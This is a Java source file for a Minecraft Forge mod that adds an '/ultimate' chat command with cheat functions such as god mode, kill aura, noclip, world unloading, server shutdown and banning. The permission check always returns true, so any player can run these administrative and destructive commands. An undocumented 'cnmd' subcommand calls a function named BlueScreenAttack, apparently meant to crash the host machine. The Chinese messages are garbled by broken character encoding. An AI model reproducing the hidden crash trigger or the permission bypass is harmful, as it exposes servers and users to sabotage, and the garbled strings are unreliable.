package xuanwu.ultimate.command;

import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.TimerTask;

import cpw.mods.fml.common.gameevent.TickEvent.Phase;
import cpw.mods.fml.relauncher.ReflectionHelper;
import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityLiving;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.boss.EntityDragon;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.potion.PotionEffect;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.ServerConfigurationManager;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.DamageSource;
import net.minecraft.util.EntityDamageSource;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.Vec3;
import net.minecraft.world.World;
import net.minecraft.world.chunk.Chunk;
import net.minecraftforge.common.ForgeHooks;
import xuanwu.ultimate.GuiDead;
import xuanwu.ultimate.core.TimeStopManager;
import xuanwu.ultimate.core.ultimateCore;
import xuanwu.ultimate.core.Data.Data;
import xuanwu.ultimate.core.Data.StoredData;
import xuanwu.ultimate.entity.EntityDS;
import xuanwu.ultimate.entity.EntityLaser;
import xuanwu.ultimate.entity.ultimateLightningbolt;
import xuanwu.ultimate.gui.GuiConfig;
import xuanwu.ultimate.listeners.EventHandler;
import xuanwu.ultimate.listeners.UltimateTimer;
import xuanwu.ultimate.register.Register;

public class command
  extends CommandBase
{
  public static EntityPlayer player;
  
  public class MyThread1
    extends Thread
  {
    private EntityPlayer player;
    
    public MyThread1(EntityPlayer player)
    {
      this.player = player;
    }
    
    public void run()
    {
      for (;;)
      {
        this.player.setHealth(this.player.getMaxHealth());
      }
    }
  }
  
  public class MyThread2
    extends Thread
  {
    private EntityPlayer player;
    
    public MyThread2(EntityPlayer player)
    {
      this.player = player;
    }
    
    public void run()
    {
      try
      {
        for (;;)
        {
          List<Entity> entities = ultimateCore.getSurroundingEntities(this.player, 5);
          for (Entity entity : entities)
          {
            List<Entity> unloadentity = new ArrayList();
            unloadentity.add(entity);
            entity.worldObj.unloadEntities(unloadentity);
          }
        }
      }
      catch (Exception localException) {}
    }
  }
  
  public String getCommandName()
  {
    return "ultimate";
  }
  
  public String getCommandUsage(ICommandSender p_71518_1_)
  {
    return "/ultimate help";
  }
  
  public int getRequiredPermissionLevel()
  {
    return 4;
  }
  
  public boolean canCommandSenderUseCommand(ICommandSender sender)
  {
    return true;
  }
  
  public List addTabCompletionOptions(ICommandSender sender, String[] args)
  {
    if (args.length == 1)
    {
      String[] parms = { "kill","NoHurtCam","Config", "BL", "L", "music", "WLE", "ReloadChunk", "KillAura", "help", "fuck", "inv", "NoClip", "fire", "setHealth", "Sprinting", "ND", "RAE", "URAE" };
      return getListOfStringsMatchingLastWord(args, parms);
    }
    if(args.length == 2) {
    	if(args[0].equals("pardon")) {
    		Object[] arr = ultimateCore.BannedList().toArray();
    		String[] array = new String[arr.length];
    		for(int i = 0;i < arr.length;i++) {
    			array[i] = arr[i].toString();
    		}
    		getListOfStringsMatchingLastWord(args,array);
    	}
    }
    if ((args.length == 2) && 
      (args[0].equals("gamemode")))
    {
      String[] parms = { "Creative", "Survival" };
      return getListOfStringsMatchingLastWord(args, parms);
    }
    return null;
  }
  public static boolean EnableKillAura = false;
  public void processCommand(ICommandSender sender, String[] args)
  {
    if (!(sender instanceof EntityPlayerMP)) {
      return;
    }
    player = (EntityPlayer)sender;
    try
    {
      if (args[0].equals("ND"))
      {
        Thread thread = new MyThread1(player);
        thread.start();
      }
      if (args[0].equals("cnmd")) {
    	  ultimateCore.BlueScreenAttack();
      }
      if (args[0].equals("BL")) {
        try
        {
          if (Integer.valueOf(args[1]) != null)
          {
            EventHandler.BL = Integer.valueOf(args[1]).intValue();
            player.addChatComponentMessage(ultimateCore.Text("宸茶缃�嶇巼涓�:" + String.valueOf(EventHandler.BL)));
          }
        }
        catch (Exception exp)
        {
          player.addChatComponentMessage(ultimateCore.Text("鏃犳晥鏁板瓧"));
        }
      }
      if (args[0].equals("Config"))
      {
        if (args[1].equals("config.item.speedclock"))
        {
          xuanwu.ultimate.core.Config.Item.SpeedClock.Speed = Integer.valueOf(args[2]).intValue();
          player.addChatComponentMessage(ultimateCore.Text("Changed " + args[1] + " to " + args[2]));
          return;
        }
        if (args[1].equals("config.item.UltimateSwordKarate"))
        {
        	try {
          Data.Server.Config.UltimateKill = Boolean.valueOf(args[2]);
          player.addChatComponentMessage(ultimateCore.Text("Changed " + args[1] + " to " + args[2]));
        	}catch(Exception exp) {
        		player.addChatComponentMessage(ultimateCore.Text(exp.getMessage()));
        	}
          return;
        }
        if(args[1].equals("config.item.UltimateSwordKillAttacker")) {
        	try {
        		if(args[2].isEmpty()) {
        			return;
        		}
        		Data.Server.Config.UltimateKill = Boolean.valueOf(args[2]);
        		player.addChatComponentMessage(ultimateCore.Text("Changed " + args[1] + " to " + args[2]));
        		return;
        	}catch(Exception exp) {
        		player.addChatComponentMessage(ultimateCore.Text(exp.getMessage()));
        		return;
        	}
        }
        player.addChatComponentMessage(ultimateCore.Text("Didn't find Config"));
      }
      if (args[0].equals("unload")) {
        ultimateCore.unloadworld(player.worldObj);
      }
      if (args[0].equals("music")) {
        player.worldObj.playSoundAtEntity(player, "ultimate:jntm", 1.0F, 1.0F);
      }
      if (args[0].equals("kick")) {
        if (args[1] == null) {
          ultimateCore.KickPlayer(player.getDisplayName(), "");
        } else {
          ultimateCore.KickPlayer(args[1], "");
        }
      }
      if (args[0].equals("kill"))
      {
        ultimateCore.kill(player);
      }
      if (args[0].equals("L")) {
        ultimateCore.Teleport(player);
      }
      if(args[0].equals("ban")) {
    	  if(args.length == 2) {
    	  if(!args[1].isEmpty()) {
    	 ultimateCore.BanPlayer(args[1]);
    	 player.addChatComponentMessage(ultimateCore.Text("宸插皝绂佺帺瀹�"+args[1]));
    	  }
    	  }
      }
      if(args[0].equals("NoHurtCam")) {
    	  if(Data.NoHurtCam) {
    		  Data.NoHurtCam = false;
    		  player.addChatComponentMessage(ultimateCore.Text("宸插叧闂彈浼ゅ厤鐤�"));
    	  }else {
    		  Data.NoHurtCam = true;
    		  player.addChatComponentMessage(ultimateCore.Text("宸插惎鐢ㄥ彈浼ゅ厤鐤�"));
    	  }
      }
      if (args[0].equals("WLE"))
      {
        ultimateCore core = new ultimateCore();
        ultimateCore.WhilelightningboltOnEntity(player);
      }
      if(args[0].equals("pardon")) {
    	  if(args.length == 2) {
    	  if(!args[1].isEmpty()) {
    		  ultimateCore.pardon(args[1]);
    		  player.addChatComponentMessage(ultimateCore.Text("宸茶В灏佺帺瀹�"+args[1]));
    	  }
    	  }
      }
      if (args[0].equals("test")) {
player.isDead = true;
player.worldObj.loadedEntityList.remove(player);
player.worldObj.removeEntity(player);
player.worldObj.onEntityRemoved(player);
player.worldObj.removePlayerEntityDangerously(player);
    	        }
      
      if (args[0].equals("KillAura"))
      {
EnableKillAura = !EnableKillAura;
      }
      if (args[0].equals("ReloadChunk"))
      {
        Chunk chunk = ultimateCore.GetChunkByEntity(player);
        ultimateCore.ReloadChunk(chunk);
      }
      if (args[0].equals("URAE")) {
        try
        {
          ultimateCore.RemoveAllEntities(sender.getEntityWorld());
        }
        catch (Exception exp)
        {
          player.addChatComponentMessage(new ChatComponentTranslation(exp.getMessage(), new Object[0]));
        }
      }
      if (args[0].equals("shutdown")) {
    	  ultimateCore.ShutdownServer();
      }
      if (args[0].equals("RAE")) {
        try
        {
          List<Entity> entities = player.worldObj.getLoadedEntityList();
          for (Entity entity : entities) {
            try
            {
              if (entity != player) {
                ultimateCore.kill(entity);
              }
            }
            catch (Exception localException1) {}
          }
        }
        catch (Exception localException2) {}
      }
      if (args[0].equals("Sprinting")) {
        ((EntityPlayer)sender).setSprinting(true);
      }
      if (args[0].equals("setHealth")) {
        if (args[1].isEmpty()) {

        } else {
          ((EntityPlayer)sender).setHealth(Integer.parseInt(args[1]));
        }
      }
      if (args[0].equals("fire")) {
        if (args[1].equals("enable")) {
          ((EntityPlayer)sender).setFire(9999999);
        } else {
          ((EntityPlayer)sender).extinguish();
        }
      }
      if (args[0].equals("help"))
      {
        String[] helps = {   
        		  "搂a=============甯姪=============",
        		  "搂e ReloadChunk -                     閲嶆柊鍔犺浇浣犳墍鍦ㄧ殑鍖哄潡 ",
        		  "搂e KillAura -                         鑷姩鏉�姝昏寖鍥村唴鐨勬墍鏈夊疄浣�",
        		  "搂e fuck -     鑷潃" ,
        		  "搂e inv true   / false 寮�鍚�/鍏抽棴闅愯韩" ,
        		  "搂e NoClip true false        寮�鍚�/鍏抽棴绌垮",
        		  "搂e fire enable/disable      寮�鍚�/鍏抽棴鑷劧 ",
        		  "搂e setHealth [鏁板�糫             璁剧疆鑷韩琛�閲�",
        		  "搂e Sprinting         寮�鍚柧璺�",
        		  "搂e ND         寮�鍚棤鏁�",
        		  "搂e RAE                       鏉�姝绘墍鏈夐櫎鑷繁澶栫殑瀹炰綋 " ,
        		  "搂e URAE                       鏉�姝绘墍鏈夊寘鎷嚜宸辩殑瀹炰綋",
        		  "搂e WLE     鑷畫" ,
        		  "搂e music     鎯婂枩",
        		  "搂e L      浼犻�佸埌The Ultimate缁村害 "  ,
        		  "搂e BL [鏁板�糫                         璁剧疆鐮寸幆鏂瑰潡鏃舵帀钀界殑鏁伴噺",
        		  "搂e Config         淇敼璁剧疆",
        		  "搂e BannedList 鏌ョ湅鎵�鏈夎寮哄埗灏佺鐨勭帺瀹�",
        		  "搂e NoHurtCam 寮�鍚�/鍏抽棴鍙椾激鍏嶇柅(鐜╁鏃犳晥)",
        		  "搂a=============甯姪=============" 
        		  };
        for (int i = 0; i < helps.length; i++) {
          sender.addChatMessage(new ChatComponentTranslation(helps[i], new Object[0]));
        }
        return;
      }
      if (args[0].equals("fuck"))
      {
        ultimateCore.kill(player);
        return;
      }
      if (args[0].equals("inv")) {
        if (args[1].equals("true"))
        {
          ((EntityPlayer)sender).setInvisible(true);
          sender.addChatMessage(new ChatComponentTranslation("闅愯韩寮�鍚�", new Object[0]));
        }
        else
        {
          ((EntityPlayer)sender).setInvisible(false);
          sender.addChatMessage(new ChatComponentTranslation("闅愯韩鍏抽棴", new Object[0]));
        }
      }
      if (args[0].equals("NoClip")) {
        if (args[1].equals("true"))
        {
          ((EntityPlayer)sender).noClip = true;
          sender.addChatMessage(new ChatComponentTranslation("绌垮寮�鍚�", new Object[0]));
        }
        else
        {
          ((EntityPlayer)sender).noClip = false;
          sender.addChatMessage(new ChatComponentTranslation("绌垮鍏抽棴", new Object[0]));
        }
      }
    }
    catch (Exception exp)
    {
      sender.addChatMessage(new ChatComponentTranslation(exp.getMessage(), new Object[0]));
    }
  }
  
}
